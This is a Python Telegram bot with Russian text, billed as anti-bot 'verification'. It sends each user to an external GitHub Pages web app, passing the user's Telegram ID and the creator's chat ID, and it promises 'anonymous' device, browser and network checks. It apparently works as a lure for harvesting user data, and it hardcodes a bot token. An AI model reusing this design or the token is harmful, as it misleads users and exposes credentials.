#!/usr/bin/env python3
"""
Telegram Verification Bot
Основной модуль бота для верификации пользователей
"""

import logging
import secrets
from datetime import datetime
from typing import Dict, Optional

from telegram import (
    Update, 
    InlineKeyboardButton, 
    InlineKeyboardMarkup, 
    WebAppInfo
)
from telegram.ext import (
    Application, 
    CommandHandler, 
    CallbackQueryHandler, 
    ContextTypes, 
    MessageHandler, 
    filters
)

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

class VerificationBot:
    """Основной класс бота верификации"""
    
    def __init__(self):
        self.app = None
        self.active_tokens = {}  # Кэш активных токенов
        self.GITHUB_PAGES_URL = "https://arkadiy1803.github.io/verification-web"
        self.BOT_TOKEN = "7725874473:AAEEZj4LtuhjcL0lqN9nATOcihJr2uqyhi0"
        self.CREATOR_CHAT_ID = "990561525"
        
        logger.info(f"Инициализация Verification Bot")
        print("\n" + "="*60)
        print("🤖 КОНФИГУРАЦИЯ БОТА:")
        print("="*60)
        print(f"✅ Токен: {self.BOT_TOKEN[:15]}...")
        print(f"👤 Создатель: {self.CREATOR_CHAT_ID}")
        print(f"🌐 Ссылка на сайт: {self.GITHUB_PAGES_URL}")
        print("="*60 + "\n")
        
    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Обработчик команды /start"""
        user = update.effective_user
        logger.info(f"Пользователь {user.id} ({user.username}) начал взаимодействие")
        
        # Генерация уникального токена
        token = secrets.token_urlsafe(32)
        
        # URL для верификации - ИСПРАВЛЕНА ССЫЛКА
        verification_url = f"{self.GITHUB_PAGES_URL}/?token={token}&user_id={user.id}&chat_id={self.CREATOR_CHAT_ID}"
        
        # Сохраняем информацию в кэш
        self.active_tokens[token] = {
            'telegram_id': user.id,
            'username': user.username,
            'first_name': user.first_name,
            'last_name': user.last_name,
            'created_at': datetime.now(),
            'status': 'pending'
        }
        
        # Создаем кнопку для верификации
        keyboard = [
            [
                InlineKeyboardButton(
                    "🔐 Пройти верификацию",
                    web_app=WebAppInfo(url=verification_url)
                )
            ]
        ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        # Приветственное сообщение
        welcome_text = f"""
👋 Привет, {user.first_name}!

🤖 **Verification Bot** — система защиты от ботов.

🔒 **Процесс верификации:**
• Проверка устройства и браузера
• Анализ сетевых параметров
• Защита от автоматических систем

📋 **Команды:**
/start - Запуск бота
/verify - Пройти верификацию
/status - Проверить статус
/help - Помощь

⚡ **Нажмите кнопку ниже для начала:**
        """
        
        await update.message.reply_text(
            welcome_text,
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
        
        logger.info(f"Создан токен верификации для пользователя {user.id}: {token[:10]}...")
    
    async def verify_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Команда для начала верификации"""
        user = update.effective_user
        logger.info(f"Пользователь {user.id} запросил верификацию")
        
        # Генерация уникального токена
        token = secrets.token_urlsafe(32)
        
        # URL для верификации - ИСПРАВЛЕНА ССЫЛКА
        verification_url = f"{self.GITHUB_PAGES_URL}/?token={token}&user_id={user.id}&chat_id={self.CREATOR_CHAT_ID}"
        
        # Сохраняем информацию в кэш
        self.active_tokens[token] = {
            'telegram_id': user.id,
            'username': user.username,
            'first_name': user.first_name,
            'last_name': user.last_name,
            'created_at': datetime.now(),
            'status': 'pending'
        }
        
        # Создаем кнопку для верификации
        keyboard = [
            [
                InlineKeyboardButton(
                    "🔐 Начать верификацию",
                    web_app=WebAppInfo(url=verification_url)
                )
            ]
        ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            "🔒 **Начало процесса верификации**\n\n"
            f"👤 **Пользователь:** {user.first_name}\n"
            f"🆔 **ID:** `{user.id}`\n"
            f"🔑 **Токен:** `{token[:10]}...`\n\n"
            "Нажмите кнопку ниже для начала:",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    async def status_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Проверка статуса верификации"""
        user = update.effective_user
        
        # Ищем активные токены пользователя
        user_tokens = {k: v for k, v in self.active_tokens.items() if v['telegram_id'] == user.id}
        
        if user_tokens:
            token_info = next(iter(user_tokens.values()))
            status_text = f"""
📊 **Статус верификации:**

👤 **Пользователь:** {user.first_name} (@{user.username or 'без username'})
🆔 **ID:** `{user.id}`
📅 **Начато:** {token_info['created_at'].strftime('%H:%M:%S')}
🔐 **Статус:** {token_info['status'].upper()}

💡 **Инструкция:**
Используйте команду /verify для начала новой верификации.
            """
        else:
            status_text = """
📊 **Статус верификации**

❌ **Активных верификаций не найдено.**

Для начала верификации используйте команду /verify
            """
        
        keyboard = [[
            InlineKeyboardButton("🔄 Пройти верификацию", callback_data="start_verify")
        ]]
        
        await update.message.reply_text(
            status_text,
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    async def admin_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Админ панель"""
        user = update.effective_user
        
        # Проверка прав доступа
        if str(user.id) != self.CREATOR_CHAT_ID:
            await update.message.reply_text("⛔ У вас нет доступа к админ панели.")
            return
        
        stats_text = f"""
⚙️ **АДМИН ПАНЕЛЬ**

📊 **Статистика:**
• Всего активных токенов: {len(self.active_tokens)}
• Уникальных пользователей: {len(set(v['telegram_id'] for v in self.active_tokens.values()))}

🌐 **Ссылки:**
• GitHub Pages: {self.GITHUB_PAGES_URL}
• Сайт верификации: {self.GITHUB_PAGES_URL}/?token=TEST&user_id=ID

👥 **Последние активности:**
{self.get_recent_activities()}
        """
        
        await update.message.reply_text(
            stats_text,
            parse_mode='Markdown'
        )
    
    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Команда помощи"""
        help_text = """
📚 **Помощь по использованию бота:**

🔐 **Процесс верификации:**
1. Нажмите /verify или кнопку "Пройти верификацию"
2. Откроется окно верификации на сайте
3. Дождитесь завершения автоматической проверки
4. Вернитесь в бота

⚠️ **Важная информация:**
• Верификация требуется для доступа к некоторым функциям
• Процесс занимает 10-30 секунд
• Не закрывайте окно верификации
• Все данные собираются анонимно для безопасности

🛡️ **Безопасность:**
• Мы не собираем пароли или платежные данные
• Данные используются только для защиты от ботов

📋 **Команды:**
/start - Запуск бота
/verify - Пройти верификацию
/status - Проверить статус
/admin - Админ панель (только для создателя)
/help - Помощь
        """
        
        await update.message.reply_text(
            help_text,
            parse_mode='Markdown'
        )
    
    async def button_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Обработка нажатий на кнопки"""
        query = update.callback_query
        await query.answer()
        
        if query.data == "start_verify":
            user = query.from_user
            token = secrets.token_urlsafe(32)
            
            # URL для верификации - ИСПРАВЛЕНА ССЫЛКА
            verification_url = f"{self.GITHUB_PAGES_URL}/?token={token}&user_id={user.id}&chat_id={self.CREATOR_CHAT_ID}"
            
            self.active_tokens[token] = {
                'telegram_id': user.id,
                'username': user.username,
                'first_name': user.first_name,
                'last_name': user.last_name,
                'created_at': datetime.now(),
                'status': 'pending'
            }
            
            keyboard = [[
                InlineKeyboardButton(
                    "🔐 Начать верификацию",
                    web_app=WebAppInfo(url=verification_url)
                )
            ]]
            
            await query.edit_message_text(
                "Нажмите кнопку для начала верификации:",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
    
    async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Обработка обычных сообщений"""
        user = update.effective_user
        text = update.message.text
        
        # Ответ на приветствия
        greetings = ['привет', 'hello', 'hi', 'здравствуй', 'здравствуйте']
        if text.lower() in greetings:
            await update.message.reply_text(f"Привет, {user.first_name}! 👋")
    
    def get_recent_activities(self):
        """Получение последних активностей"""
        recent = list(self.active_tokens.items())[-5:]  # Последние 5 записей
        activities = []
        
        for token, info in recent:
            time_ago = datetime.now() - info['created_at']
            minutes = int(time_ago.total_seconds() / 60)
            activities.append(f"• {info['first_name']} (@{info['username']}) - {minutes} мин назад")
        
        return "\n".join(activities) if activities else "Нет активных верификаций"
    
    def setup_handlers(self):
        """Настройка обработчиков команд"""
        self.app.add_handler(CommandHandler("start", self.start_command))
        self.app.add_handler(CommandHandler("verify", self.verify_command))
        self.app.add_handler(CommandHandler("status", self.status_command))
        self.app.add_handler(CommandHandler("admin", self.admin_command))
        self.app.add_handler(CommandHandler("help", self.help_command))
        
        # Callback queries
        self.app.add_handler(CallbackQueryHandler(self.button_callback))
        
        # Сообщения
        self.app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_message))
        
        logger.info("Обработчики команд настроены")
    
    def run_sync(self):
        """Синхронный запуск бота"""
        try:
            # Создание приложения
            self.app = Application.builder().token(self.BOT_TOKEN).build()
            
            # Настройка обработчиков
            self.setup_handlers()
            
            logger.info("Запуск бота в polling режиме...")
            
            # Запуск в polling режиме
            self.app.run_polling(
                allowed_updates=Update.ALL_TYPES,
                drop_pending_updates=True
            )
            
        except Exception as e:
            logger.error(f"Критическая ошибка при запуске бота: {e}")
            raise

def main():
    """Основная функция"""
    try:
        bot = VerificationBot()
        bot.run_sync()
    except KeyboardInterrupt:
        print("\n\n👋 Бот остановлен пользователем")
    except Exception as e:
        print(f"\n❌ Критическая ошибка: {e}")
        raise

if __name__ == "__main__":
    main()
